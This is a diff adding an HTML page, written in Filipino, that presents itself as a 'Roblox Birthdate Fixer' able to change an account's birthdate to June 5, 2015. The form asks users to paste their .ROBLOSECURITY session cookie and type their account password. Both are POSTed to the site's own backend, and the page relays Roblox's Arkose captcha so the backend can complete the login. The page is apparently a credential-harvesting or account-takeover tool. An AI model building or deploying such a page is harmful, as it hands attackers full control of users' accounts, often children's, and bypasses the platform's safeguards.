@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Birthdate Fixer Tool</title>
+    <!-- Opisyal na Captcha Script ng Arkose Labs para sa Roblox -->
+    <script src="https://roblox-api.arkoselabs.com/v2/476068BF-6E07-4795-B591-B996E96F4790/api.js" async defer></script>
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #191b1f; color: #ffffff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 450px; background: #22252a; padding: 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.3); text-align: center; }
+        h2 { margin-bottom: 5px; color: #00e676; }
+        p { color: #b0b3b8; font-size: 14px; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 12px; color: #a0a5ad; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 12px; background: #2d3238; border: 2px solid #3a3f47; border-radius: 6px; color: #fff; font-size: 14px; outline: none; transition: 0.2s; }
+        input:focus { border-color: #00e676; }
+        button { width: 100%; background: #00e676; color: #191b1f; border: none; padding: 14px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; transition: 0.2s; }
+        button:hover { background: #00c853; }
+        #status { margin-top: 20px; font-size: 14px; font-weight: bold; padding: 10px; border-radius: 6px; display: none; }
+        #captcha-container { margin-top: 20px; display: flex; justify-content: center; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Roblox Birthdate Fixer</h2>
+    <p>Baguhin ang iyong kapanganakan sa June 5, 2015 gamit ang tool na ito.</p>
+    
+    <div class="input-group">
+        <label>.ROBLOSECURITY COOKIE</label>
+        <input type="text" id="cookie" placeholder="I-paste ang buong cookie dito...">
+    </div>
+
+    <div class="input-group">
+        <label>ACCOUNT PASSWORD</label>
+        <input type="password" id="password" placeholder="I-type ang iyong password para sa verification...">
+    </div>
+    
+    <button onclick="startProcess()">I-update ang Account</button>
+
+    <div id="status"></div>
+    <div id="captcha-container"></div>
+</div>
+
+<script>
+    let savedChallengeId = "";
+
+    function showStatus(text, color, bgColor) {
+        const statusDiv = document.getElementById('status');
+        statusDiv.innerText = text;
+        statusDiv.style.color = color;
+        statusDiv.style.backgroundColor = bgColor;
+        statusDiv.style.display = "block";
+    }
+
+    async function startProcess() {
+        const cookie = document.getElementById('cookie').value.trim();
+        const password = document.getElementById('password').value.trim();
+        
+        if(!cookie || !password) {
+            showStatus("❌ Pakisagutan ang Cookie at Password.", "#ff5252", "rgba(255,82,82,0.1)");
+            return;
+        }
+
+        showStatus("⏳ Sinusuri ang account sa Roblox...", "#ffd740", "rgba(255,215,64,0.1)");
+        document.getElementById('captcha-container').innerHTML = ""; 
+
+        try {
+            let response = await fetch('/update-birthdate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookie: cookie, password: password })
+            });
+
+            let result = await response.json();
+
+            if (result.success) {
+                showStatus("✅ Tagumpay! Napalitan na ang iyong Birthdate sa Roblox!", "#69f0ae", "rgba(105,240,174,0.1)");
+            } else if (result.captcha_required) {
+                showStatus("⚠️ Kailangan ng Verification! Pakisagutan ang Captcha sa ibaba.", "#ffb74d", "rgba(255,183,77,0.1)");
+                savedChallengeId = result.challengeId;
+                loadRobloxCaptcha(result.challengeId, result.challengeMetadata);
+            } else {
+                showStatus("❌ Error: " + (result.message || "Maling detalye."), "#ff5252", "rgba(255,82,82,0.1)");
+            }
+        } catch (err) {
+            showStatus("❌ Hindi makakonekta sa server backend.", "#ff5252", "rgba(255,82,82,0.1)");
+        }
+    }
+
+    function loadRobloxCaptcha(challengeId, blobMetadata) {
+        try {
+            let decoded = JSON.parse(atob(blobMetadata));
+            
+            new ArkoseEnforcement({
+                public_key: "476068BF-6E07-4795-B591-B996E96F4790",
+                target_html_id: "captcha-container",
+                data: { blob: decoded.contentInlineBase64 },
+                onCompleted: function(responseObject) {
+                    showStatus("⏳ Nalutas ang Captcha! Tinatapos na ang pag-save...", "#ffd740", "rgba(255,215,64,0.1)");
+                    finishProcess(responseObject.token);
+                }
+            });
+        } catch(e) {
+            showStatus("❌ Error sa pag-load ng Captcha Widget.", "#ff5252", "rgba(255,82,82,0.1)");
+        }
+    }
+
+    async function finishProcess(captchaToken) {
+        const cookie = document.getElementById('cookie').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        try {
+            let response = await fetch('/update-birthdate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    cookie: cookie,
+                    password: password,
+                    challengeId: savedChallengeId,
+                    challengeMetadata: captchaToken
+                })
+            });
+
+            let result = await response.json();
+
+            if (result.success) {
+                showStatus("✅ Tagumpay! Tapos na, binago na ng Roblox ang Birthdate!", "#69f0ae", "rgba(105,240,174,0.1)");
+                document.getElementById('captcha-container').innerHTML = ""; 
+            } else {
+                showStatus("❌ Nabigo pa rin: " + result.message, "#ff5252", "rgba(255,82,82,0.1)");
+            }
+        } catch (err) {
+            showStatus("❌ Nagka-error sa pag-send ng Captcha Token.", "#ff5252", "rgba(255,82,82,0.1)");
+        }
+    }
+</script>
+
+</body>
+  </html>
